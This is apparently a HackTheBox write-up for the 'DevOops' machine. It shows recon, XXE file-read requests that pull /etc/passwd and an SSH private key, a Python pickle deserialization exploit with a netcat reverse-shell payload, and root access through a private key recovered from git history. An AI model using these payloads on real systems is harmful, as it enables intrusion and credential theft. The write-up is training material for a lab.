# Hackthebox Dev0ops


Before we start I always reset the box, it is often that services have crashed or behaves in unintended ways after others have exploited them. And I do not want any spoilers that may have been left by others on the box.


## Recon

First, as always. we perform our initial enumeration of the box using Nmap.

```
# Nmap 7.70 scan initiated Tue Sep 11 16:07:07 2018 as: nmap -v -sV -p- -oA devops_full 10.10.10.91
Nmap scan report for 10.10.10.91
Host is up (0.11s latency).
Not shown: 65488 closed ports, 45 filtered ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
5000/tcp open  http    Gunicorn 19.7.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
```

Let's check if we have any known exploits for the enumerated services

```
root@kali:~/htb/devoops# searchsploit --nmap -v devops_full.xml                                                                                                                                              
[i] Reading: 'devops_full.xml'                

[i] /usr/bin/searchsploit -t openssh 7 2p2
------------------------------------------------------------- ----------------------------------------
 Exploit Title                                               |  Path
                                                             | (/usr/share/exploitdb/)
------------------------------------------------------------- ----------------------------------------
OpenSSH 7.2p2 - Username Enumeration                         | exploits/linux/remote/40136.py
OpenSSHd 7.2p2 - Username Enumeration                        | exploits/linux/remote/40113.txt
------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result

[i] /usr/bin/searchsploit -t openssh 7 2p2 ubuntu

[i] /usr/bin/searchsploit -t gunicorn
```

The running version of SSH is vulnerable to a username enumeration attack.

```
msf auxiliary(scanner/ssh/ssh_enumusers) > run                                                                                                                                                               
                                                                                                                                                                                                             
[*] 10.10.10.91:22 - SSH - Using malformed packet technique                                                                                                                                                  
[*] 10.10.10.91:22 - SSH - Starting scan                                            
[+] 10.10.10.91:22 - SSH - User 'avahi' found                                                                                                                                                                
[+] 10.10.10.91:22 - SSH - User 'avahi-autoipd' found                                                                                                                                                        
[+] 10.10.10.91:22 - SSH - User 'backup' found 
[+] 10.10.10.91:22 - SSH - User 'bin' found  
[+] 10.10.10.91:22 - SSH - User 'daemon' found  
[+] 10.10.10.91:22 - SSH - User 'games' found
[+] 10.10.10.91:22 - SSH - User 'gnats' found
[+] 10.10.10.91:22 - SSH - User 'hplip' found
[+] 10.10.10.91:22 - SSH - User 'irc' found
[+] 10.10.10.91:22 - SSH - User 'kernoops' found
[+] 10.10.10.91:22 - SSH - User 'list' found
[+] 10.10.10.91:22 - SSH - User 'lp' found
[+] 10.10.10.91:22 - SSH - User 'mail' found
[+] 10.10.10.91:22 - SSH - User 'man' found
[+] 10.10.10.91:22 - SSH - User 'messagebus' found
[+] 10.10.10.91:22 - SSH - User 'news' found
[+] 10.10.10.91:22 - SSH - User 'nobody' found
[+] 10.10.10.91:22 - SSH - User 'proxy' found
[+] 10.10.10.91:22 - SSH - User 'pulse' found
[+] 10.10.10.91:22 - SSH - User 'root' found
[+] 10.10.10.91:22 - SSH - User 'saned' found
[+] 10.10.10.91:22 - SSH - User 'speech-dispatcher' found
[+] 10.10.10.91:22 - SSH - User 'sshd' found
[+] 10.10.10.91:22 - SSH - User 'sync' found
[+] 10.10.10.91:22 - SSH - User 'sys' found
[+] 10.10.10.91:22 - SSH - User 'syslog' found
[+] 10.10.10.91:22 - SSH - User 'uucp' found
[+] 10.10.10.91:22 - SSH - User 'www-data' found

[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
Using Metasploit and a simple wordlist we found some valid users. Mostly standard users though. We could expand on this attack with a larger and better wordlist.

### Content Discovery

Next I am performing som basic content discovery using Gobuster. 

```
root@kali:~/htb/devoops# gobuster -u http://10.10.10.91:5000 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-directories.txt                                                              

=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.91:5000/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-directories.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2018/11/08 21:25:38 Starting gobuster
=====================================================
/feed (Status: 200)
/upload (Status: 200)
=====================================================
2018/11/08 21:32:54 Finished
=====================================================
```
Here we find a couple of interesting folders. The upload folder contains a file upload functionality with the text 

```
This is a test API! The final API will not have this functionality.
Upload a new file

XML elements: Author, Subject, Content
```

So we are supposed to upload an XML document with specific elements. When dealing with XML, XXE comes directly to mind.

First let's just try to upload a valid XML file. I create an xml file and catch the POST request with Burp.


```
POST /upload HTTP/1.1
Host: 10.10.10.91:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.91:5000/upload
Content-Type: multipart/form-data; boundary=---------------------------181545552219239238581108160943
Content-Length: 352
Connection: close
Upgrade-Insecure-Requests: 1

-----------------------------181545552219239238581108160943
Content-Disposition: form-data; name="file"; filename="test.xml"
Content-Type: text/xml

<?xml version="1.0" encoding="UTF-8"?>
<feed>
  <Author>Test</Author>
  <Subject>Test</Subject>
  <Content>Test</Content>
</feed>
-----------------------------181545552219239238581108160943--
```

We get the following response:

```
HTTP/1.1 200 OK
Server: gunicorn/19.7.1
Date: Thu, 08 Nov 2018 20:42:23 GMT
Connection: close
Content-Type: text/html; charset=utf-8
Content-Length: 150

 PROCESSED BLOGPOST: 
  Author: Test
 Subject: Test
 Content: Test
 URL for later reference: /uploads/test.xml
 File path: /home/roosa/deploy/src
 ```

 

## Initial Compromise

It works. Lets use a little more malicious payload:

```
POST /upload HTTP/1.1
Host: 10.10.10.91:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.91:5000/upload
Content-Type: multipart/form-data; boundary=---------------------------181545552219239238581108160943
Content-Length: 449
Connection: close
Upgrade-Insecure-Requests: 1

-----------------------------181545552219239238581108160943
Content-Disposition: form-data; name="file"; filename="test.xml"
Content-Type: text/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [  
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<feed>
  <Author>Test&xxe;</Author>
  <Subject>Test</Subject>
  <Content>Test</Content>
</feed>
-----------------------------181545552219239238581108160943--
```

Response:

```
HTTP/1.1 200 OK
Server: gunicorn/19.7.1
Date: Thu, 08 Nov 2018 20:44:33 GMT
Connection: close
Content-Type: text/html; charset=utf-8
Content-Length: 2589

 PROCESSED BLOGPOST: 
  Author: Testroot:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
uuidd:x:107:111::/run/uuidd:/bin/false
lightdm:x:108:114:Light Display Manager:/var/lib/lightdm:/bin/false
whoopsie:x:109:117::/nonexistent:/bin/false
avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/false
colord:x:113:123:colord colour management daemon,,,:/var/lib/colord:/bin/false
speech-dispatcher:x:114:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false
kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
pulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false
rtkit:x:118:126:RealtimeKit,,,:/proc:/bin/false
saned:x:119:127::/var/lib/saned:/bin/false
usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
osboxes:x:1000:1000:osboxes.org,,,:/home/osboxes:/bin/false
git:x:1001:1001:git,,,:/home/git:/bin/bash
roosa:x:1002:1002:,,,:/home/roosa:/bin/bash
sshd:x:121:65534::/var/run/sshd:/usr/sbin/nologin
blogfeed:x:1003:1003:,,,:/home/blogfeed:/bin/false

 Subject: Test
 Content: Test
 URL for later reference: /uploads/test.xml
 File path: /home/roosa/deploy/src
```

We have XXE and can read files off the system.

Trying some common juicy files such as the shadow file and SSH private key of the roosa user we get one hit on the private key:

Request:

```
POST /upload HTTP/1.1
Host: 10.10.10.91:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.91:5000/upload
Content-Type: multipart/form-data; boundary=---------------------------181545552219239238581108160943
Content-Length: 461
Connection: close
Upgrade-Insecure-Requests: 1

-----------------------------181545552219239238581108160943
Content-Disposition: form-data; name="file"; filename="test.xml"
Content-Type: text/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [  
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM "file:///home/roosa/.ssh/id_rsa" >]>
<feed>
  <Author>Test&xxe;</Author>
  <Subject>Test</Subject>
  <Content>Test</Content>
</feed>
-----------------------------181545552219239238581108160943--
```

Response:

```
HTTP/1.1 200 OK
Server: gunicorn/19.7.1
Date: Thu, 08 Nov 2018 20:46:30 GMT
Connection: close
Content-Type: text/html; charset=utf-8
Content-Length: 1825

 PROCESSED BLOGPOST: 
  Author: Test-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAuMMt4qh/ib86xJBLmzePl6/5ZRNJkUj/Xuv1+d6nccTffb/7
9sIXha2h4a4fp18F53jdx3PqEO7HAXlszAlBvGdg63i+LxWmu8p5BrTmEPl+cQ4J
R/R+exNggHuqsp8rrcHq96lbXtORy8SOliUjfspPsWfY7JbktKyaQK0JunR25jVk
v5YhGVeyaTNmSNPTlpZCVGVAp1RotWdc/0ex7qznq45wLb2tZFGE0xmYTeXgoaX4
9QIQQnoi6DP3+7ErQSd6QGTq5mCvszpnTUsmwFj5JRdhjGszt0zBGllsVn99O90K
m3pN8SN1yWCTal6FLUiuxXg99YSV0tEl0rfSUwIDAQABAoIBAB6rj69jZyB3lQrS
JSrT80sr1At6QykR5ApewwtCcatKEgtu1iWlHIB9TTUIUYrYFEPTZYVZcY50BKbz
ACNyme3rf0Q3W+K3BmF//80kNFi3Ac1EljfSlzhZBBjv7msOTxLd8OJBw8AfAMHB
lCXKbnT6onYBlhnYBokTadu4nbfMm0ddJo5y32NaskFTAdAG882WkK5V5iszsE/3
koarlmzP1M0KPyaVrID3vgAvuJo3P6ynOoXlmn/oncZZdtwmhEjC23XALItW+lh7
e7ZKcMoH4J2W8OsbRXVF9YLSZz/AgHFI5XWp7V0Fyh2hp7UMe4dY0e1WKQn0wRKe
8oa9wQkCgYEA2tpna+vm3yIwu4ee12x2GhU7lsw58dcXXfn3pGLW7vQr5XcSVoqJ
Lk6u5T6VpcQTBCuM9+voiWDX0FUWE97obj8TYwL2vu2wk3ZJn00U83YQ4p9+tno6
NipeFs5ggIBQDU1k1nrBY10TpuyDgZL+2vxpfz1SdaHgHFgZDWjaEtUCgYEA2B93
hNNeXCaXAeS6NJHAxeTKOhapqRoJbNHjZAhsmCRENk6UhXyYCGxX40g7i7T15vt0
ESzdXu+uAG0/s3VNEdU5VggLu3RzpD1ePt03eBvimsgnciWlw6xuZlG3UEQJW8sk
A3+XsGjUpXv9TMt8XBf3muESRBmeVQUnp7RiVIcCgYBo9BZm7hGg7l+af1aQjuYw
agBSuAwNy43cNpUpU3Ep1RT8DVdRA0z4VSmQrKvNfDN2a4BGIO86eqPkt/lHfD3R
KRSeBfzY4VotzatO5wNmIjfExqJY1lL2SOkoXL5wwZgiWPxD00jM4wUapxAF4r2v
vR7Gs1zJJuE4FpOlF6SFJQKBgHbHBHa5e9iFVOSzgiq2GA4qqYG3RtMq/hcSWzh0
8MnE1MBL+5BJY3ztnnfJEQC9GZAyjh2KXLd6XlTZtfK4+vxcBUDk9x206IFRQOSn
y351RNrwOc2gJzQdJieRrX+thL8wK8DIdON9GbFBLXrxMo2ilnBGVjWbJstvI9Yl
aw0tAoGAGkndihmC5PayKdR1PYhdlVIsfEaDIgemK3/XxvnaUUcuWi2RhX3AlowG
xgQt1LOdApYoosALYta1JPen+65V02Fy5NgtoijLzvmNSz+rpRHGK6E8u3ihmmaq
82W3d4vCUPkKnrgG8F7s3GL6cqWcbZBd0j9u88fUWfPxfRaQU3s=
-----END RSA PRIVATE KEY-----

 Subject: Test
 Content: Test
 URL for later reference: /uploads/test.xml
 File path: /home/roosa/deploy/src
```

Now we can simply log in as the user with the private key:

```
root@kali:~/htb/devoops# ssh -i roosa_id_rsa -oKexAlgorithms=+diffie-hellman-group1-sha1 roosa@10.10.10.91
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.13.0-37-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

135 packages can be updated.
60 updates are security updates.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

roosa@gitter:~$ id
uid=1002(roosa) gid=1002(roosa) groups=1002(roosa),4(adm),27(sudo)
roosa@gitter:~$ 
```

### Getting user through a Pickle Exploit

There is another way to get user on this box.

Leveraging our XXE vulnerability in the webservice, we could also view the source of the feed.py file that is mentioned on the page.

```
@app.route("/newpost", methods=["POST"])
def newpost():
  # TODO: proper save to database, this is for testing purposes right now
  picklestr = base64.urlsafe_b64decode(request.data)
#  return picklestr
  postObj = pickle.loads(picklestr)
  return "POST RECEIVED: " + postObj['Subject']
 ```

The part above from the feed.py shows an endpoint called "newpost", which takes data through a POST request and passes it to pickles.load. pickles.load esentially executes the base64 encoded pickle data.

Exploit:

```
import pickle
from base64 import urlsafe_b64encode

# Reverse shell payload
SHELL = """rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.17 1234 >/tmp/f"""

# Pickle unserialisation exploit
class Exploit(object):
    def __reduce__(self):
        import os
        return (os.system,(SHELL,))

# Base64 encode and pickle the exploit
print urlsafe_b64encode(pickle.dumps(Exploit()))
```

Generating payload:

```
root@kali:~/htb/devoops# python pickle-exploit.py 
Y3Bvc2l4CnN5c3RlbQpwMAooUydybSAvdG1wL2Y7bWtmaWZvIC90bXAvZjtjYXQgL3RtcC9mfC9iaW4vc2ggLWkgMj4mMXxuYyAxMC4xMC4xNC4xNyAxMjM0ID4vdG1wL2YnCnAxCnRwMgpScDMKLg==
```

Request:

```
POST /newpost HTTP/1.1
Host: 10.10.10.91:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: text
Content-Length: 152

Y3Bvc2l4CnN5c3RlbQpwMAooUydybSAvdG1wL2Y7bWtmaWZvIC90bXAvZjtjYXQgL3RtcC9mfC9iaW4vc2ggLWkgMj4mMXxuYyAxMC4xMC4xNC4xNyAxMjM0ID4vdG1wL2YnCnAxCnRwMgpScDMKLg==
```

Shell:

```
root@kali:~/htb/devoops# nc -lvp 1234
listening on [any] 1234 ...
10.10.10.91: inverse host lookup failed: Unknown host
connect to [10.10.14.17] from (UNKNOWN) [10.10.10.91] 43534
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=1002(roosa) gid=1002(roosa) groups=1002(roosa),4(adm),27(sudo)
$ 
```


## Establish Foothold

The first thing I usually do when I have an initial foothold on a system is to upgrade our shell. This is because some tasks and exploits during our privesc phase may require a full TTY to work. Trust me, I have learned this the hard way.

We have a good enough foothold with our SSH access.


## Privilege Escalation

A typical Linux privilege Escalation method is based on checking one of the following:

1. Exploiting services running as root
2. Exploiting SUID executables
3. Exploiting SUDO rights/user
4. Exploiting badly configured cron jobs
5. Exploiting users with "." in their path
6. Kernel Exploits

Kernel exploits are typically our last resort, as there is a risk that we crash the system in the process. 

There are several scripts that automates this process for us.

Checking the bash history of the user we see a lot of interesting stuff. There seems to be some potential passwords

```
export WERKZEUG_DEBUG_PIN=15123786
emacs ../run-gunicorn.sh 
export WERKZEUG_DEBUG_PIN=151237
cat ../run-gunicorn.sh 
../run-gunicorn.sh 
emacs ../run-gunicorn.sh 
export WERKZEUG_DEBUG_PIN=151237652
../run-gunicorn.sh 
```

We also see some git commands

```
git status                                                                                                                                                                                                   
git add feed.py                                                                                                                                                                                              
cat ../run-gunicorn.sh                                                                                                                                                                                       
git add ../run-gunicorn.sh                                                                                                                                                                                   
git commit -m 'Set PIN to make debugging faster as it will no longer change every time the application code is changed. Remember to remove before production use.'                                           
git push                                                                                                                                                                                                     
git log                            
```

So the user is potentially a developer of the website. Doing some more digging I found a git repo in the /work/blogfeed/.git/ folder. 

Checking the commit history we see the follwing commits:

```
roosa@gitter:~/work/blogfeed$ git log 
commit 7ff507d029021b0915235ff91e6a74ba33009c6d
Author: Roosa Hakkerson <roosa@solita.fi>
Date:   Mon Mar 26 06:13:55 2018 -0400

    Use Base64 for pickle feed loading

commit 26ae6c8668995b2f09bf9e2809c36b156207bfa8
Author: Roosa Hakkerson <roosa@solita.fi>
Date:   Tue Mar 20 15:37:00 2018 -0400

    Set PIN to make debugging faster as it will no longer change every time the application code is changed. Remember to remove before production use.

commit cec54d8cb6117fd7f164db142f0348a74d3e9a70
Author: Roosa Hakkerson <roosa@solita.fi>
Date:   Tue Mar 20 15:08:09 2018 -0400

    Debug support added to make development more agile.

commit ca3e768f2434511e75bd5137593895bd38e1b1c2
Author: Roosa Hakkerson <roosa@solita.fi>
Date:   Tue Mar 20 08:38:21 2018 -0400

    Blogfeed app, initial version.

commit dfebfdfd9146c98432d19e3f7d83cc5f3adbfe94
Author: Roosa Hakkerson <roosa@solita.fi>
Date:   Tue Mar 20 08:37:56 2018 -0400

    Gunicorn startup script

commit 33e87c312c08735a02fa9c796021a4a3023129ad
Author: Roosa Hakkerson <roosa@solita.fi>
Date:   Mon Mar 19 09:33:06 2018 -0400

    reverted accidental commit with proper key

commit d387abf63e05c9628a59195cec9311751bdb283f
Author: Roosa Hakkerson <roosa@solita.fi>
Date:   Mon Mar 19 09:32:03 2018 -0400

    add key for feed integration from tnerprise backend

commit 1422e5a04d1b52a44e6dc81023420347e257ee5f
Author: Roosa Hakkerson <roosa@solita.fi>
Date:   Mon Mar 19 09:24:30 2018 -0400

    Initial commit
```

Walking though each of these commits, the one labled "reverted accidental commit with proper key" gives us a hint.

```
roosa@gitter:~/work/blogfeed$ git diff d387abf63e05c9628a59195cec9311751bdb283f                                                                                                                              
diff --git a/resources/integration/authcredentials.key b/resources/integration/authcredentials.key                                                                                                           
index 44c981f..f4bde49 100644                                                                                                                                                                                
--- a/resources/integration/authcredentials.key                                                                                                                                                              
+++ b/resources/integration/authcredentials.key                                                                                                                                                              
@@ -1,28 +1,27 @@                                 
 -----BEGIN RSA PRIVATE KEY-----                                                                                                                                                                             
-MIIEogIBAAKCAQEArDvzJ0k7T856dw2pnIrStl0GwoU/WFI+OPQcpOVj9DdSIEde                                                                                                                                            
-8PDgpt/tBpY7a/xt3sP5rD7JEuvnpWRLteqKZ8hlCvt+4oP7DqWXoo/hfaUUyU5i                                                                                                                                            
-vr+5Ui0nD+YBKyYuiN+4CB8jSQvwOG+LlA3IGAzVf56J0WP9FILH/NwYW2iovTRK                                                                                                                                            
-nz1y2vdO3ug94XX8y0bbMR9Mtpj292wNrxmUSQ5glioqrSrwFfevWt/rEgIVmrb+                                                                                                                                            
-CCjeERnxMwaZNFP0SYoiC5HweyXD6ZLgFO4uOVuImILGJyyQJ8u5BI2mc/SHSE0c                                                                                                                                            
-F9DmYwbVqRcurk3yAS+jEbXgObupXkDHgIoMCwIDAQABAoIBAFaUuHIKVT+UK2oH                                                                                                                                            
-uzjPbIdyEkDc3PAYP+E/jdqy2eFdofJKDocOf9BDhxKlmO968PxoBe25jjjt0AAL                                                                                                                                            
-gCfN5I+xZGH19V4HPMCrK6PzskYII3/i4K7FEHMn8ZgDZpj7U69Iz2l9xa4lyzeD                                                                                                                                            
-k2X0256DbRv/ZYaWPhX+fGw3dCMWkRs6MoBNVS4wAMmOCiFl3hzHlgIemLMm6QSy                                                                                                                                            
-NnTtLPXwkS84KMfZGbnolAiZbHAqhe5cRfV2CVw2U8GaIS3fqV3ioD0qqQjIIPNM                                                                                                                                            
-HSRik2J/7Y7OuBRQN+auzFKV7QeLFeROJsLhLaPhstY5QQReQr9oIuTAs9c+oCLa                                                                                                                                            
-2fXe3kkCgYEA367aoOTisun9UJ7ObgNZTDPeaXajhWrZbxlSsOeOBp5CK/oLc0RB                                                                                                                                            
-GLEKU6HtUuKFvlXdJ22S4/rQb0RiDcU/wOiDzmlCTQJrnLgqzBwNXp+MH6Av9WHG                                                                                                                                            
-jwrjv/loHYF0vXUHHRVJmcXzsftZk2aJ29TXud5UMqHovyieb3mZ0pcCgYEAxR41                                                                                                                                            
-IMq2dif3laGnQuYrjQVNFfvwDt1JD1mKNG8OppwTgcPbFO+R3+MqL7lvAhHjWKMw                                                                                                                                            
-+XjmkQEZbnmwf1fKuIHW9uD9KxxHqgucNv9ySuMtVPp/QYtjn/ltojR16JNTKqiW                                                                                                                                            
-7vSqlsZnT9jR2syvuhhVz4Ei9yA/VYZG2uiCpK0CgYA/UOhz+LYu/MsGoh0+yNXj                                                                                                                                            
-Gx+O7NU2s9sedqWQi8sJFo0Wk63gD+b5TUvmBoT+HD7NdNKoEX0t6VZM2KeEzFvS                                                                                                                                            
-iD6fE+5/i/rYHs2Gfz5NlY39ecN5ixbAcM2tDrUo/PcFlfXQhrERxRXJQKPHdJP7                                                                                                                                            
-VRFHfKaKuof+bEoEtgATuwKBgC3Ce3bnWEBJuvIjmt6u7EFKj8CgwfPRbxp/INRX                                                                                                                                            
-S8Flzil7vCo6C1U8ORjnJVwHpw12pPHlHTFgXfUFjvGhAdCfY7XgOSV+5SwWkec6                                                                                                                                            
-md/EqUtm84/VugTzNH5JS234dYAbrx498jQaTvV8UgtHJSxAZftL8UAJXmqOR3ie                                                                                                                                            
-LWXpAoGADMbq4aFzQuUPldxr3thx0KRz9LJUJfrpADAUbxo8zVvbwt4gM2vsXwcz                                                                                                                                            
-oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw                                                                                                                                            
-LS4O7JPRqVmgZzUUnDiAVuUHWuHGGXpWpz9EGau6dIbQaUUSOEE=  

+MIIEpQIBAAKCAQEApc7idlMQHM4QDf2d8MFjIW40UickQx/cvxPZX0XunSLD8veN                                                                                                                                            
+ouroJLw0Qtfh+dS6y+rbHnj4+HySF1HCAWs53MYS7m67bCZh9Bj21+E4fz/uwDSE                                                                                                                                            
+23g18kmkjmzWQ2AjDeC0EyWH3k4iRnABruBHs8+fssjW5sSxze74d7Ez3uOI9zPE                                                                                                                                            
+sQ26ynmLutnd/MpyxFjCigP02McCBrNLaclcbEgBgEn9v+KBtUkfgMgt5CNLfV8s                                                                                                                                            
+ukQs4gdHPeSj7kDpgHkRyCt+YAqvs3XkrgMDh3qI9tCPfs8jHUvuRHyGdMnqzI16                                                                                                                                            
+ZBlx4UG0bdxtoE8DLjfoJuWGfCF/dTAFLHK3mwIDAQABAoIBADelrnV9vRudwN+h                                                                                                                                            
+LZ++l7GBlge4YUAx8lkipUKHauTL5S2nDZ8O7ahejb+dSpcZYTPM94tLmGt1C2bO                                                                                                                                            
+JqlpPjstMu9YtIhAfYF522ZqjRaP82YIekpaFujg9FxkhKiKHFms/2KppubiHDi9                                                                                                                                            
+oKL7XLUpSnSrWQyMGQx/Vl59V2ZHNsBxptZ+qQYavc7bGP3h4HoRurrPiVlmPwXM                                                                                                                                            
+xL8NWx4knCZEC+YId8cAqyJ2EC4RoAr7tQ3xb46jC24Gc/YFkI9b7WCKpFgiszhw                                                                                                                                            
+vFvkYQDuIvzsIyunqe3YR0v8TKEfWKtm8T9iyb2yXTa+b/U3I9We1P+0nbfjYX8x                                                                                                                                            
+6umhQuECgYEA0fvp8m2KKJkkigDCsaCpP5dWPijukHV+CLBldcmrvUxRTIa8o4e+                                                                                                                                            
+OWOMW1JPEtDTj7kDpikekvHBPACBd5fYnqYnxPv+6pfyh3H5SuLhu9PPA36MjRyE                                                                                                                                            
+4+tDgPvXsfQqAKLF3crG9yKVUqw2G8FFo7dqLp3cDxCs5sk6Gq/lAesCgYEAyiS0                                                                                                                                            
+937GI+GDtBZ4bjylz4L5IHO55WI7CYPKrgUeKqi8ovKLDsBEboBbqRWcHr182E94                                                                                                                                            
+SQMoKu++K1nbly2YS+mv4bOanSFdc6bT/SAHKdImo8buqM0IhrYTNvArN/Puv4VT                                                                                                                                            
+Nszh8L9BDEc/DOQQQzsKiwIHab/rKJHZeA6cBRECgYEAgLg6CwAXBxgJjAc3Uge4                                                                                                                                            
+eGDe3y/cPfWoEs9/AptjiaD03UJi9KPLegaKDZkBG/mjFqFFmV/vfAhyecOdmaAd                                                                                                                                            
+i/Mywc/vzgLjCyBUvxEhazBF4FB8/CuVUtnvAWxgJpgT/1vIi1M4cFpkys8CRDVP                                                                                                                                            
+6TIQBw+BzEJemwKTebSFX40CgYEAtZt61iwYWV4fFCln8yobka5KoeQ2rCWvgqHb
+8rH4Yz0LlJ2xXwRPtrMtJmCazWdSBYiIOZhTexe+03W8ejrla7Y8ZNsWWnsCWYgV
+RoGCzgjW3Cc6fX8PXO+xnZbyTSejZH+kvkQd7Uv2ZdCQjcVL8wrVMwQUouZgoCdA
+qML/WvECgYEAyNoevgP+tJqDtrxGmLK2hwuoY11ZIgxHUj9YkikwuZQOmFk3EffI
+T3Sd/6nWVzi1FO16KjhRGrqwb6BCDxeyxG508hHzikoWyMN0AA2st8a8YS6jiOog
+bU34EzQLp7oRU/TKO6Mx5ibQxkZPIHfgA1+Qsu27yIwlprQ64+oeEr0=
 -----END RSA PRIVATE KEY-----
 ```

 So here we have a private SSH key that was modified.

 Let's clean up the output and try to log in as root using both of the keys.

```
root@kali:~/htb/devoops# ssh -i private_key -oKexAlgorithms=+diffie-hellman-group1-sha1 root@10.10.10.91
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.13.0-37-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

135 packages can be updated.
60 updates are security updates.

Last login: Mon Mar 26 06:23:48 2018 from 192.168.57.1
root@gitter:~# id
uid=0(root) gid=0(root) groups=0(root)
```

So the user committed a private key belonging to the root user to /resources/integration/authcredentials.key. And then later replaced it with some other key. 

Looking through the commit history we were able to retrieve the removed root key.
